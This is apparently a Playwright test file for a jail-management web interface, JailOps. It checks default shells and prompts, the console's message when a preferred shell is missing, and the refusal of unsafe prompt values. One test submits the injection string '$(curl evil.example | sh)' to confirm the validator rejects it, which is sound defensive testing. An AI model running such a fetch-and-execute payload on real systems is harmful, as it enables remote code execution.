import { test, expect, type Page } from '@playwright/test'
import { audit } from '../../shared/a11y'

// The shell of a jail (docs/shell.md): new jails get the coloured prompt, JailOps never installs a shell (a console
// whose preferred shell is missing says how to install it and can open sh), and the prompt key is checked like the
// server checks it.

function watch(page: Page): string[] {
  const problems: string[] = []
  page.on('console', (m) => m.type() === 'error' && problems.push(m.text()))
  page.on('pageerror', (e) => problems.push(String(e)))
  return problems
}

async function open(page: Page, path: string): Promise<void> {
  await page.goto('/?demo')
  await page.waitForSelector('.shell')
  await page.evaluate((p) => { history.pushState({}, '', p); dispatchEvent(new PopStateEvent('popstate')) }, path)
  await page.waitForLoadState('networkidle')
}

test('a new jail gets the default prompt and the shell the form chose', async ({ page }) => {
  const problems = watch(page)
  await open(page, '/jails')
  await page.getByTestId('new-jail').click()
  await expect(page.locator('#jc-shell')).toHaveValue('')
  await expect(page.locator('#jc-shell-hint')).toContainText('JailOps does not install it')
  expect(await audit(page)).toEqual([])
  await page.locator('#jc-name').fill('fresh')
  await page.locator('#jc-shell').selectOption('bash')
  await page.getByTestId('jail-create-go').click()
  await expect(page.locator('[data-test="jails-table"]')).toContainText('fresh')
  await page.getByTestId('new-jail').click()
  await page.locator('#jc-name').fill('plain')
  await page.locator('#jc-shell').selectOption('sh')
  await page.getByTestId('jail-create-go').click()
  await expect(page.locator('[data-test="jails-table"]')).toContainText('plain')
  // the Configuration tab shows what each got (links inside the page: the demo keeps its state)
  await page.locator('[data-test="jails-table"]').getByRole('link', { name: 'fresh', exact: true }).click()
  await page.locator('[data-tab="config"]').click()
  await expect(page.locator('#k-shell')).toHaveValue('/usr/local/bin/bash')
  await expect(page.locator('#k-prompt')).toHaveValue('default')
  await expect(page.locator('[data-key="prompt"]')).toContainText("A user's own ~/.bashrc wins")
  await page.goBack()
  await page.locator('[data-test="jails-table"]').getByRole('link', { name: 'plain', exact: true }).click()
  await page.locator('[data-tab="config"]').click()
  await expect(page.locator('#k-shell')).toHaveValue('/bin/sh')
  await expect(page.locator('#k-prompt')).toHaveValue('default')
  expect(problems).toEqual([])
})

test('a prompt that would run a command is refused with the reason', async ({ page }) => {
  await open(page, '/jails/web?tab=config')
  await page.locator('#k-prompt').fill('$(curl evil.example | sh)')
  await page.getByTestId('config-save').click()
  await expect(page.getByTestId('error-panel')).toContainText('$ only as \\$')
  await page.locator('#k-prompt').fill('\\[\\e[38;5;196m\\]\\u@\\h:\\w\\$\\[\\e[0m\\] ')
  await page.getByTestId('config-save').click()
  await expect(page.getByTestId('unsaved')).toHaveCount(0)
})

for (const scheme of ['light', 'dark'] as const) {
  test.describe(scheme, () => {
    test.use({ colorScheme: scheme })
    test('a jail whose preferred shell is not installed says how to install it and opens sh, and the prompt is blue', async ({ page }) => {
      const problems = watch(page)
      await open(page, '/jails/web?tab=config')
      await page.locator('#k-shell').fill('bash')
      await page.locator('#k-prompt').fill('default')
      await page.getByTestId('config-save').click()
      await expect(page.getByTestId('unsaved')).toHaveCount(0)
      await page.locator('[data-tab="console"]').click()
      await page.getByTestId('exec-open').click()
      await expect(page.getByTestId('exec-setup')).toContainText('jailops pkg install web -- bash')
      await expect(page.getByTestId('error-panel')).toContainText('the shell /usr/local/bin/bash is not installed in jail web')
      expect(await audit(page)).toEqual([])
      await page.getByTestId('exec-setup-go').click()
      await expect(page.getByTestId('terminal')).toContainText('root@web:/#')
      await expect(page.getByTestId('exec-setup')).toHaveCount(0)
      const color = await page.getByTestId('terminal').locator('span', { hasText: 'root@web:/#' }).first().evaluate((el) => getComputedStyle(el).color)
      expect(color).toBe('rgb(0, 175, 255)')
      expect(problems.filter((p) => !p.includes('412'))).toEqual([])
    })
  })
}
